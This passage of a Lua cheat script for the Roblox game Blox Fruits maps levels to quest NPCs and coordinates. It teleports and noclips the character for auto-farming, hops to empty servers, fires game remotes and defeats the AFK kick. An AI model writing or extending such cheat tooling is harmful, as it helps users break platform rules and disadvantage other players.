                NameMon = "Marine Rear Admiral"
                NameQuest = "MarineTreeIsland"
                LevelQuest = 2
                CFrameQuest = CFrame.new(2179.98828125, 28.731239318848, -6740.0551757813)
                CFrameMon = CFrame.new(3656.773681640625, 160.52406311035156, -7001.5986328125)
            elseif MyLevel == 1775 or MyLevel <= 1799 then
                Mon = "Fishman Raider"
                LevelQuest = 1
                NameQuest = "DeepForestIsland3"
                NameMon = "Fishman Raider"
                CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)   
                CFrameMon = CFrame.new(-10407.5263671875, 331.76263427734375, -8368.5166015625)
            elseif MyLevel == 1800 or MyLevel <= 1824 then
                Mon = "Fishman Captain"
                LevelQuest = 2
                NameQuest = "DeepForestIsland3"
                NameMon = "Fishman Captain"
                CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)   
                CFrameMon = CFrame.new(-10994.701171875, 352.38140869140625, -9002.1103515625) 
            elseif MyLevel == 1825 or MyLevel <= 1849 then
                Mon = "Forest Pirate"
                LevelQuest = 1
                NameQuest = "DeepForestIsland"
                NameMon = "Forest Pirate"
                CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                CFrameMon = CFrame.new(-13274.478515625, 332.3781433105469, -7769.58056640625)
            elseif MyLevel == 1850 or MyLevel <= 1899 then
                Mon = "Mythological Pirate"
                LevelQuest = 2
                NameQuest = "DeepForestIsland"
                NameMon = "Mythological Pirate"
                CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)   
                CFrameMon = CFrame.new(-13680.607421875, 501.08154296875, -6991.189453125)
            elseif MyLevel == 1900 or MyLevel <= 1924 then
                Mon = "Jungle Pirate"
                LevelQuest = 1
                NameQuest = "DeepForestIsland2"
                NameMon = "Jungle Pirate"
                CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                CFrameMon = CFrame.new(-12256.16015625, 331.73828125, -10485.8369140625)
            elseif MyLevel == 1925 or MyLevel <= 1974 then
                Mon = "Musketeer Pirate"
                LevelQuest = 2
                NameQuest = "DeepForestIsland2"
                NameMon = "Musketeer Pirate"
                CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                CFrameMon = CFrame.new(-13457.904296875, 391.545654296875, -9859.177734375)
            elseif MyLevel == 1975 or MyLevel <= 1999 then
                Mon = "Reborn Skeleton"
                LevelQuest = 1
                NameQuest = "HauntedQuest1"
                NameMon = "Reborn Skeleton"
                CFrameQuest = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                CFrameMon = CFrame.new(-8763.7236328125, 165.72299194335938, 6159.86181640625)
            elseif MyLevel == 2000 or MyLevel <= 2024 then
                Mon = "Living Zombie"
                LevelQuest = 2
                NameQuest = "HauntedQuest1"
                NameMon = "Living Zombie"
                CFrameQuest = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                CFrameMon = CFrame.new(-10144.1318359375, 138.62667846679688, 5838.0888671875)
            elseif MyLevel == 2025 or MyLevel <= 2049 then
                Mon = "Demonic Soul"
                LevelQuest = 1
                NameQuest = "HauntedQuest2"
                NameMon = "Demonic Soul"
                CFrameQuest = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0) 
                CFrameMon = CFrame.new(-9505.8720703125, 172.10482788085938, 6158.9931640625)
            elseif MyLevel == 2050 or MyLevel <= 2074 then
                Mon = "Posessed Mummy"
                LevelQuest = 2
                NameQuest = "HauntedQuest2"
                NameMon = "Posessed Mummy"
                CFrameQuest = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-9582.0224609375, 6.251527309417725, 6205.478515625)
            elseif MyLevel == 2075 or MyLevel <= 2099 then
                Mon = "Peanut Scout"
                LevelQuest = 1
                NameQuest = "NutsIslandQuest"
                NameMon = "Peanut Scout"
                CFrameQuest = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-2143.241943359375, 47.72198486328125, -10029.9951171875)
            elseif MyLevel == 2100 or MyLevel <= 2124 then
                Mon = "Peanut President"
                LevelQuest = 2
                NameQuest = "NutsIslandQuest"
                NameMon = "Peanut President"
                CFrameQuest = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-1859.35400390625, 38.10316848754883, -10422.4296875)
            elseif MyLevel == 2125 or MyLevel <= 2149 then
                Mon = "Ice Cream Chef"
                LevelQuest = 1
                NameQuest = "IceCreamIslandQuest"
                NameMon = "Ice Cream Chef"
                CFrameQuest = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-872.24658203125, 65.81957244873047, -10919.95703125)
            elseif MyLevel == 2150 or MyLevel <= 2199 then
                Mon = "Ice Cream Commander"
                LevelQuest = 2
                NameQuest = "IceCreamIslandQuest"
                NameMon = "Ice Cream Commander"
                CFrameQuest = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-558.06103515625, 112.04895782470703, -11290.7744140625)
            elseif MyLevel == 2200 or MyLevel <= 2224 then
                Mon = "Cookie Crafter"
                LevelQuest = 1
                NameQuest = "CakeQuest1"
                NameMon = "Cookie Crafter"
                CFrameQuest = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -8.80302053e-08, 0.288177818, 6.9301187e-08, 1, 7.51931211e-08, -0.288177818, -5.2032135e-08, 0.957576931)
                CFrameMon = CFrame.new(-2374.13671875, 37.79826354980469, -12125.30859375)
            elseif MyLevel == 2225 or MyLevel <= 2249 then
                Mon = "Cake Guard"
                LevelQuest = 2
                NameQuest = "CakeQuest1"
                NameMon = "Cake Guard"
                CFrameQuest = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -8.80302053e-08, 0.288177818, 6.9301187e-08, 1, 7.51931211e-08, -0.288177818, -5.2032135e-08, 0.957576931)
                CFrameMon = CFrame.new(-1598.3070068359375, 43.773197174072266, -12244.5810546875)
            elseif MyLevel == 2250 or MyLevel <= 2274 then
                Mon = "Baking Staff"
                LevelQuest = 1
                NameQuest = "CakeQuest2"
                NameMon = "Baking Staff"
                CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                CFrameMon = CFrame.new(-1887.8099365234375, 77.6185073852539, -12998.3505859375)
            elseif MyLevel == 2275 or MyLevel <= 2299 then
                Mon = "Head Baker"
                LevelQuest = 2
                NameQuest = "CakeQuest2"
                NameMon = "Head Baker"
                CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                CFrameMon = CFrame.new(-2216.188232421875, 82.884521484375, -12869.2939453125)
            elseif MyLevel == 2300 or MyLevel <= 2324 then
                Mon = "Cocoa Warrior"
                LevelQuest = 1
                NameQuest = "ChocQuest1"
                NameMon = "Cocoa Warrior"
                CFrameQuest = CFrame.new(233.22836303710938, 29.876001358032227, -12201.2333984375)
                CFrameMon = CFrame.new(-21.55328369140625, 80.57499694824219, -12352.3876953125)
            elseif MyLevel == 2325 or MyLevel <= 2349 then
                Mon = "Chocolate Bar Battler"
                LevelQuest = 2
                NameQuest = "ChocQuest1"
                NameMon = "Chocolate Bar Battler"
                CFrameQuest = CFrame.new(233.22836303710938, 29.876001358032227, -12201.2333984375)
                CFrameMon = CFrame.new(582.590576171875, 77.18809509277344, -12463.162109375)
            elseif MyLevel == 2350 or MyLevel <= 2374 then
                Mon = "Sweet Thief"
                LevelQuest = 1
                NameQuest = "ChocQuest2"
                NameMon = "Sweet Thief"
                CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875)
                CFrameMon = CFrame.new(165.1884765625, 76.05885314941406, -12600.8369140625)
            elseif MyLevel == 2375 or MyLevel <= 2399 then
                Mon = "Candy Rebel"
                LevelQuest = 2
                NameQuest = "ChocQuest2"
                NameMon = "Candy Rebel"
                CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875)
                CFrameMon = CFrame.new(134.86563110351562, 77.2476806640625, -12876.5478515625)
            elseif MyLevel == 2400 or MyLevel <= 2424 then
                Mon = "Candy Pirate"
                LevelQuest = 1
                NameQuest = "CandyQuest1"
                NameMon = "Candy Pirate"
                CFrameQuest = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375)
                CFrameMon = CFrame.new(-1310.5003662109375, 26.016523361206055, -14562.404296875)
            elseif MyLevel == 2425 or MyLevel <= 2449 then
                Mon = "Snow Demon"
                LevelQuest = 2
                NameQuest = "CandyQuest1"
                NameMon = "Snow Demon"
                CFrameQuest = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375)
                CFrameMon = CFrame.new(-880.2006225585938, 71.24776458740234, -14538.609375)
            elseif MyLevel == 2450 or MyLevel <= 2474 then
                Mon = "Isle Outlaw"
                LevelQuest = 1
                NameQuest = "TikiQuest1"
                NameMon = "Isle Outlaw"
                CFrameQuest = CFrame.new(-16547.748046875, 61.13533401489258, -173.41360473632812)
                CFrameMon = CFrame.new(-16442.814453125, 116.13899993896484, -264.4637756347656)
            elseif MyLevel == 2475 or MyLevel <= 2499 then
                Mon = "Island Boy"
                LevelQuest = 2
                NameQuest = "TikiQuest1"
                NameMon = "Island Boy"
                CFrameQuest = CFrame.new(-16547.748046875, 61.13533401489258, -173.41360473632812)
                CFrameMon = CFrame.new(-16901.26171875, 84.06756591796875, -192.88906860351562)
            elseif MyLevel == 2500 or MyLevel <= 2524 then
                Mon = "Sun-kissed Warrior"
                LevelQuest = 1
                NameQuest = "TikiQuest2"
                NameMon = "kissed"
                CFrameQuest = CFrame.new(-16539.078125, 55.68632888793945, 1051.5738525390625)
                CFrameMon = CFrame.new(-16349.8779296875, 92.0808334350586, 1123.4169921875)
            elseif MyLevel == 2525 or MyLevel <= 2550 then
                Mon = "Isle Champion"
                LevelQuest = 2
                NameQuest = "TikiQuest2"
                NameMon = "Isle Champion"
                CFrameQuest = CFrame.new(-16539.078125, 55.68632888793945, 1051.5738525390625)
                CFrameMon = CFrame.new(-16347.4150390625, 92.09503936767578, 1122.335205078125)
            end
        end
    end

    function HopLowServer(bO)
        pcall(function()
            if not bO then
                bO = 5 -- Số lượng người chơi tối đa
            end
            
            local ticklon = tick()
            repeat
                task.wait()
            until tick() - ticklon >= 1
    
            local function Hop()
                for r = 1, math.huge do
                    local ChooseRegion = "Singapore" -- Mặc định là Singapore
                    game:GetService("Players").LocalPlayer.PlayerGui.ServerBrowser.Frame.Filters.SearchRegion.TextBox.Text = ChooseRegion
                    
                    local bP = game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(r)
                    for k, v in pairs(bP) do
                        if k ~= game.JobId and v["Count"] < bO then
                            game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", k)
                            print("Đang chuyển đến server với " .. v["Count"] .. " người chơi.")
                            return -- Thoát sau khi teleport thành công
                        end
                    end
                end
            end
    
            if not getgenv().Loaded then
                local function handleErrorPrompt(v)
                    if v.Name == "ErrorPrompt" and v.Visible then
                        if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                            print("Teleport thất bại, thử lại...")
                            HopLowServer(bO) -- Thử lại
                            v.Visible = false
                        end
                    end
                end
    
                for _, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
                    handleErrorPrompt(v)
                end
                
                game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(handleErrorPrompt)
                getgenv().Loaded = true
            end
    
            while task.wait(0.1) do
                Hop() -- Gọi hàm Hop
            end
        end)
    end
function TPP(CFgo)
	if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health <= 0 or not game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid") then tween:Cancel() repeat wait() until game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid") and game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health > 0 wait(7) return end
	local tween_s = game:service"TweenService"
	local info = TweenInfo.new((game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - CFgo.Position).Magnitude/TweenSpeed, Enum.EasingStyle.Linear)
	tween = tween_s:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = CFgo})
	tween:Play()

	local tweenfunc = {}

	function tweenfunc:Stop()
		tween:Cancel()
	end

	return tweenfunc
end
    
    function AutoHaki()
        if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("HasBuso") then
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso")
        end
    end
    
    function UnEquipWeapon(Weapon)
        if game.Players.LocalPlayer.Character:FindFirstChild(Weapon) then
            _G.NotAutoEquip = true
            wait(.5)
            game.Players.LocalPlayer.Character:FindFirstChild(Weapon).Parent = game.Players.LocalPlayer.Backpack
            wait(.1)
            _G.NotAutoEquip = false
        end
    end

function EquipWeapon(ToolSe)
	if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
		local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
		wait(.4)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
	end
end    
    
    function EquipWeapon(ToolSe)
        if not _G.NotAutoEquip then
            if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
                Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
                wait(.1)
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(Tool)
            end
        end
    end
  
    function GetDistance(target)
        return math.floor((target.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude)
    end
    
    function BTP(p)
    	pcall(function()
	    	if (p.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 1500 and not Auto_Raid and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
				repeat wait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
					wait(0.5)
					game.Players.LocalPlayer.Character.Head:Destroy()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
				until (p.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 1500 and game.Players.LocalPlayer.Character.Humanoid.Health > 0
			end
		end)
	end
    function TP(Pos)
        Distance = (Pos.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        if Distance < 300 then
            Speed = 300
        elseif Distance >= 1000 then
            Speed = 300
        end
        game:GetService("TweenService"):Create(
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
            {CFrame = Pos}
        ):Play()
        _G.Clip = true
        wait(Distance/Speed)
        _G.Clip = false
    end

function UwU(Pos)
        Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        if game.Players.LocalPlayer.Character.Humanoid.Sit == true then game.Players.LocalPlayer.Character.Humanoid.Sit = false end
        pcall(function() tween = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(Distance/315, Enum.EasingStyle.Linear),{CFrame = Pos}) end)
        tween:Play()
        if Distance <= 200 then
            tween:Cancel()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
        end
        if _G.StopTween == true then
            tween:Cancel()
            _G.Clip = false
        end
    end

    function CheckNearestTeleporter(aI)
        local MyLevel = game.Players.LocalPlayer.Data.Level.Value
        vcspos = aI.Position
        min = math.huge
        min2 = math.huge
        local y = game.PlaceId
        if y == 2753915549 then
            OldWorld = true
        elseif y == 4442272183 then
            NewWorld = true
        elseif y == 7449423635 then
            ThreeWorld = true
        end
        if World3 then
            TableLocations = {
                ["Caslte On The Sea"] = Vector3.new(-5058.77490234375, 314.5155029296875, -3155.88330078125),
                ["Hydra"] = Vector3.new(5756.83740234375, 610.4240112304688, -253.9253692626953),
                ["Mansion"] = Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125),
                ["Great Tree"] = Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586),
                ["Ngu1"] = Vector3.new(-11993.580078125, 334.7812805175781, -8844.1826171875),
                ["ngu2"] = Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656)
            }
        elseif World2 then
            TableLocations = {
                ["Mansion"] = Vector3.new(-288.46246337890625, 306.130615234375, 597.9988403320312),
                ["Flamingo"] = Vector3.new(2284.912109375, 15.152046203613281, 905.48291015625),
                ["122"] = Vector3.new(923.21252441406, 126.9760055542, 32852.83203125),
                ["3032"] = Vector3.new(-6508.5581054688, 89.034996032715, -132.83953857422)
            }
        elseif world1 then
            TableLocations = {
                ["1"] = Vector3.new(-7894.6201171875, 5545.49169921875, -380.2467346191406),
                ["2"] = Vector3.new(-4607.82275390625, 872.5422973632812, -1667.556884765625),
                ["3"] = Vector3.new(61163.8515625, 11.759522438049316, 1819.7841796875),
                ["4"] = Vector3.new(3876.280517578125, 35.10614013671875, -1939.3201904296875)
            }
        end
        TableLocations2 = {}
        for r, v in pairs(TableLocations) do
            TableLocations2[r] = (v - vcspos).Magnitude
        end
        for r, v in pairs(TableLocations2) do
            if v < min then
                min = v
                min2 = v
            end
        end
        for r, v in pairs(TableLocations2) do
            if v < min then
                min = v
                min2 = v
            end
        end
        for r, v in pairs(TableLocations2) do
            if v <= min then
                choose = TableLocations[r]
            end
        end
        min3 = (vcspos - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        if min2 <= min3 then
            return choose
        end
    end
    
    function requestEntrance(aJ)
        args = {"requestEntrance", aJ}
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
        oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        char = game.Players.LocalPlayer.Character.HumanoidRootPart
        char.CFrame = CFrame.new(oldcframe.X, oldcframe.Y + 50, oldcframe.Z)
        task.wait(0.5)
    end
    
    function AntiLowHealth(aK)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
            CFrame.new(
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
            aK,
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
        )
        wait()
    end
    TweenSpeed = 350
    function topos(aL)
        pcall(function()
                if game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid") and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and  game:GetService("Players").LocalPlayer.Character.Humanoid.Health > 0 and game:GetService("Players").LocalPlayer.Character.HumanoidRootPart then
                    if not TweenSpeed then
                        TweenSpeed = 350
                    end
                    DefualtY = aL.Y
                    TargetY = aL.Y
                    targetCFrameWithDefualtY = CFrame.new(aL.X, DefualtY, aL.Z)
                    targetPos = aL.Position
                    oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    Distance = (targetPos - game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude
                    if Distance <= 300 then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = aL
                    end
                    local aM = CheckNearestTeleporter(aL)
                    if aM then
                        pcall(function()
                                tween:Cancel()
                            end)
                        requestEntrance(aM)
                    end
                    b1 = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,DefualtY,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
                    if IngoreY and (b1.Position - targetCFrameWithDefualtY.Position).Magnitude > 5 then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,DefualtY,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
                        local tweenfunc = {}
                        local aN = game:service "TweenService"
                        local aO =
                            TweenInfo.new((targetPos -game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude /TweenSpeed,Enum.EasingStyle.Linear)
                        tween = aN:Create(game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"],aO,{CFrame = targetCFrameWithDefualtY})
                        tween:Play()
                        function tweenfunc:Stop()
                            tween:Cancel()
                        end
                        tween.Completed:Wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,TargetY,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
                    else
                        local tweenfunc = {}
                        local aN = game:service "TweenService"
                        local aO =
                            TweenInfo.new((targetPos -game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude /TweenSpeed,Enum.EasingStyle.Linear)
                        tween = aN:Create(game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"],aO,{CFrame = aL})
                        tween:Play()
                        function tweenfunc:Stop()
                            tween:Cancel()
                        end
                        tween.Completed:Wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,TargetY,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
                    end
                    if not tween then
                        return tween
                    end
                    return tweenfunc
                end
            end
        )
    end
IngoreY = true
Type = 1
spawn(function()
    while wait(.1) do
		if Type == 1 then
			Pos = CFrame.new(0,PosY,-30)
		elseif Type == 2 then
			Pos = CFrame.new(30,PosY,0)
		elseif Type == 3 then
			Pos = CFrame.new(0,PosY,30)	
		elseif Type == 4 then
			Pos = CFrame.new(-30,PosY,0)
        end
        end
    end)

spawn(function()
    while wait(0.5) do
        Type = 1
        wait(0.4)
        Type = 2
        wait(0.3)
        Type = 3
        wait(0.4)
        Type = 4
        wait(0.2)
        Type = 5
        wait(0.3)
    end
end)

spawn(function()
    while wait(.1) do
        Frame = 1
        wait(0.4)
        Frame = 2
        wait(0.4)
        Frame = 3
        wait(0.3)
        Frame = 4
        wait(0.4)
        Frame = 5
        wait(0.3)
    end
end)

Type = 1
spawn(function()
    while wait(.1) do
        if Frame == 1 then
            Check = CFrame.new(0,50,0)
		elseif F == 2 then
			Check = CFrame.new(0,0,-100)
		elseif F == 3 then
			Check = CFrame.new(100,0,0)
		elseif F == 4 then
			Check = CFrame.new(0,0,100)	
		elseif F == 5 then
			Check = CFrame.new(-100,0,0)
		elseif F == 6 then
			Check = CFrame.new(0,50,0)
        end
        end
    end)

spawn(function()
    while wait(.1) do
        F = 1
        wait(0.5)
        F = 2
        wait(0.5)
        F = 3
        wait(0.5)
        F = 4
        wait(0.5)
        F = 5
        wait(0.5)
    end
end)

function TPP(CFgo)
	if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health <= 0 or not game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid") then tween:Cancel() repeat wait() until game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid") and game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health > 0 wait(7) return end
	local tween_s = game:service"TweenService"
	local info = TweenInfo.new((game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - CFgo.Position).Magnitude/325, Enum.EasingStyle.Linear)
	tween = tween_s:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = CFgo})
	tween:Play()

	local tweenfunc = {}

	function tweenfunc:Stop()
		tween:Cancel()
	end

	return tweenfunc
end

getgenv().ToTargets = function(p)
    task.spawn(function()
        pcall(function()
            if game:GetService("Players").LocalPlayer:DistanceFromCharacter(p.Position) <= 250 then 
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = p
            elseif not game.Players.LocalPlayer.Character:FindFirstChild("Root")then 
                local K = Instance.new("Part",game.Players.LocalPlayer.Character)
                K.Size = Vector3.new(1,0.5,1)
                K.Name = "Root"
                K.Anchored = true
                K.Transparency = 1
                K.CanCollide = false
                K.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,20,0)
            end
            local U = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude
            local z = game:service("TweenService")
            local B = TweenInfo.new((p.Position-game.Players.LocalPlayer.Character.Root.Position).Magnitude/300,Enum.EasingStyle.Linear)
            local S,g = pcall(function()
            local q = z:Create(game.Players.LocalPlayer.Character.Root,B,{CFrame = p})
            q:Play()
        end)
        if not S then 
            return g
        end
        game.Players.LocalPlayer.Character.Root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            if S and game.Players.LocalPlayer.Character:FindFirstChild("Root") then 
                pcall(function()
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude >= 20 then 
                        spawn(function()
                            pcall(function()
                                if (game.Players.LocalPlayer.Character.Root.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 150 then 
                                    game.Players.LocalPlayer.Character.Root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                else 
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game.Players.LocalPlayer.Character.Root.CFrame
                                end
                            end)
                        end)
                    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude >= 10 and(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude < 20 then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
                    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude < 10 then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
                    end
                end)
            end
	    end)
    end)
    end

    spawn(function()
        pcall(function()
            while wait() do
                if _G.AutoFarm or _G.Tweenfruit or _G.Auto_Dungeon or _G.Kill_V4 or _G.AutoComplete_Race or _G.RaDaoKhi or _G.Luom_Gear or _G.DaoBiLon or _G.BayDao or _G.Eli_Ngu or _G.Long_Ma_Bac_Giang or _G.Gan_Duoc_Cho_Khi or _G.Kiem_Lua or Auto_Ki_Di or _G.Khi_Dot_Len_Dien or _G.Quest_Nhu_Cai_Lon or _G.Katakuri_V2_Nhu_lon or _G.Auto_Nha_Dien or _G.Cuttay or _G.ThangDauMatLon or Gan_Haki_Lon or _G.HaiCac or _G.Shanda or BatDauKaitun or _TerroSharkVaPirranhaOMG or _G.Zone6 or _G.TeleportPly or _G.RaidPirate or _G.Raidlaw or StartFarm or FarmMasGun or _G.Chest or _G.Buoi == true then
                    if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                        local Noclip = Instance.new("BodyVelocity")
                        Noclip.Name = "BodyClip"
                        Noclip.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
                        Noclip.MaxForce = Vector3.new(100000,100000,100000)
                        Noclip.Velocity = Vector3.new(0,0,0)
                    end
                end
            end
        end)
    end)
  
    spawn(function()
        pcall(function()
            game:GetService("RunService").Stepped:Connect(function()
                if _G.AutoFarm or _G.Tweenfruit or _G.Auto_Dungeon or _G.Kill_V4 or _G.AutoComplete_Race or _G.RaDaoKhi or _G.Luom_Gear or _G.DaoBiLon or _G.BayDao or _G.Eli_Ngu or _G.Long_Ma_Bac_Giang or _G.Gan_Duoc_Cho_Khi or _G.Kiem_Lua or Auto_Ki_Di or _G.Khi_Dot_Len_Dien or _G.Quest_Nhu_Cai_Lon or _G.Katakuri_V2_Nhu_lon or _G.Auto_Nha_Dien or _G.Cuttay or _G.ThangDauMatLon or Gan_Haki_Lon or _G.HaiCac or _G.Shanda or BatDauKaitun or _TerroSharkVaPirranhaOMG or _G.Zone6 or _G.TeleportPly or _G.RaidPirate or _G.Raidlaw or StartFarm or FarmMasGun or _G.Chest or _G.Buoi == true then
                    for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false    
                        end
                    end
                end
            end)
        end)
    end)   
    
spawn(function()
        while wait() do
            if _G.AutoFarm or _G.Kill_V4 == true then
                pcall(function()
                    game:GetService("ReplicatedStorage").Remotes.CommE:FireServer("Ken",true)
                end)
            end    
        end
    end)    
    
    function InstancePos(pos)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
    end    
   spawn(function()
        pcall(function()
            while wait() do
                for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do  
                    if v:IsA("Tool") then
                        if v:FindFirstChild("RemoteFunctionShoot") then 
                            SelectWeaponGun = v.Name
                        end
                    end
                end
            end
        end)
    end)
    
    game:GetService("Players").LocalPlayer.Idled:connect(function()
        game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        wait(1)
